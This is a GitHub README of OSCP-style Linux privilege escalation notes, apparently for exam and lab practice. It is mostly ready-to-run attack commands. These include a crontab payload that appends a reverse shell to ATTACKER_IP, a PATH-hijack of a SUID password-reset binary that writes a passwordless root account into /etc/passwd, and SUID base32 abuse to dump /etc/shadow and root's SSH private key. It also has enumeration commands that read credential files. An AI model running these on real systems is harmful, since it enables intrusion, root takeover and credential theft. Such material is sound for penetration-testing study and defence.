# Linux PrivEsc
<img width="1024" height="1024" alt="Husky hacker linux privesc" src="https://github.com/user-attachments/assets/4cb89d22-e761-4975-81f9-d6ffbd9f57f8" />

## Manual Checks:

```
sudo -l
find / -perm -4000 -type f 2>/dev/null
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null
cat /etc/crontab
crontab -l
ls -la /etc/cron*
ps aux
cat /etc/passwd
cat /etc/shadow
cat ~/.bash_history
uname -a 
```
Check to see if you can use dirty cow, gtfo bins, sudo promissions, etc. 

Quick wins with crontab:
```
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /opt/backup.sh
```

## Linux Recon script
This is a bash shell script that does the manual checks for you, not as in-depth, but easier to run. 
```
wget https://raw.githubusercontent.com/HackingHusky/OSCPv.2/privesc linux/linuxOS_recon.sh
```
Or download from this repo and share it like Linpeas
```
python3 -m http.server 8000   # attacker machine
wget http://ATTACKER_IP/linuxOS_recon.sh
chmod +x linuxOS_recon.sh
./linuxOS_recon.sh
```
Or if you want to save the output:
```
./linuxOS_recon.sh | tee recon.txt
```
The scripts will also do the same. You would need to share it. 

## Password Reset
This one, I really needed to learn about. If you see a RESET_PASSWD as a SUID

```
strace /home/user/RESET_PASSWD 2>&1 | grep -E "open|exec"
```
```
strings /home/user/RESET_PASSWD
```
The win is here:
```
cat <<EOF > /tmp/chpasswd
#!/bin/sh
echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
EOF
chmod +x /tmp/chpasswd
export PATH=/tmp:$PATH
/home/user/RESET_PASSWD
su pwned
```

## SUID base32
Total Quick win here, if you run SUID and find this:
/usr/bin/base32
Run these as a test

```
base32 /etc/shadow | base32 -d
```
```
base32 /root/.ssh/id_rsa | base32 -d
```
Could be an easy win by getting the password or the id_rsa key; test with ssh2john, and if you get no password loaded. You can just sign in as normal. 

## linpeas

```
git clone https://github.com/peass-ng/PEASS-ng/releases/tag/20260306-5620909d
```
## PSPY link
https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1

## Write up

I got over it more in my blog post here:

https://medium.com/@aaronashley466/oscp-notes-linux-privesc-cheatsheet-a73a48eeed0e
